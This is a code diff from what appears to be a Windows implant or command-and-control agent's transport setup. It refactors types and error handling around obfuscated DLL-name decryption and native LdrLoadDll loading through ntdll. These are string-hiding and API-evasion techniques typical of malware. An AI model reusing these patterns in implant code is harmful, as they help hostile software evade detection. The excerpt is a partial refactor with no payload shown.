@@ -58,28 +58,28 @@ BOOL TransportInit( ) {
 
 #if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
-    unsigned char s_kernel32[] = S_KERNEL32;
-    unsigned char s_advapi32[] = S_ADVAPI32;
-    unsigned char s_iphlpapi[] = S_IPHLPAPI;
+    UCHAR s_kernel32[] = S_KERNEL32;
+    UCHAR s_advapi32[] = S_ADVAPI32;
+    UCHAR s_iphlpapi[] = S_IPHLPAPI;
 
-    unsigned char s_xkey[] = S_XK;
+    UCHAR s_xkey[] = S_XK;
 
-    unsigned char d_kernel32[14] = {0};
-    unsigned char d_advapi32[14] = {0};
-    unsigned char d_iphlpapi[14] = {0};
+    UCHAR d_kernel32[14] = {0};
+    UCHAR d_advapi32[14] = {0};
+    UCHAR d_iphlpapi[14] = {0};
 
-    ROL_AND_DECRYPT((const char *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (const char *)s_xkey);
-    ROL_AND_DECRYPT((const char *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (const char *)s_xkey);
-    ROL_AND_DECRYPT((const char *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (const char *)s_xkey);
+    ROL_AND_DECRYPT((CONST CHAR *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (CONST CHAR *)s_xkey);
+    ROL_AND_DECRYPT((CONST CHAR *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (CONST CHAR *)s_xkey);
+    ROL_AND_DECRYPT((CONST CHAR *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (CONST CHAR *)s_xkey);
 
     HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);
 
 #if CONFIG_NATIVE == TRUE
 
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    VOID *p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    VOID *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
     NTSTATUS status;
     UNICODE_STRING usAdvapi32;
@@ -97,14 +97,8 @@ BOOL TransportInit( ) {
     PVOID p_advapi32 = NULL;
     PVOID p_iphlpapi = NULL;
 
-    if((status = p_LdrLoadDll(NULL, NULL, &usAdvapi32, &p_advapi32)) != 0x0){
-        return -1;
-    }
-
-    if((status = p_LdrLoadDll(NULL, NULL, &usIphlpapi, &p_iphlpapi)) != 0x0){
-        return -1;
-    }
-
+    check_debug(p_LdrLoadDll(NULL, NULL, &usAdvapi32, &p_advapi32) == 0 , "LdrLoadDll advapi32 Failed!");
+    check_debug(p_LdrLoadDll(NULL, NULL, &usIphlpapi, &p_iphlpapi) == 0 , "LdrLoadDll iphlpapi Failed!");
 
 #else
     HANDLE p_advapi32 = LoadLibrary(d_advapi32);
@@ -270,9 +264,22 @@ BOOL TransportInit( ) {
         }
     }
     LEAVE:
+
     if(Data != NULL){
         DATA_FREE(Data, Length)
     }
+
+    if(pwcAdvapi32 != NULL){
+        int lenWAdvapi32 = lstrlenW(pwcAdvapi32);
+        DATA_FREE(pwcAdvapi32,lenWAdvapi32)
+    }
+
+    if(pwcIphlpapi != NULL){
+        int lenWIphlpapi = lstrlenW(pwcIphlpapi);
+        DATA_FREE(pwcIphlpapi,lenWIphlpapi)
+    }
+
+
 #if CONFIG_OBFUSCATION == TRUE
     // zero out decrypted strings
     mem_set(d_kernel32,0x0,strlen(s_kernel32));
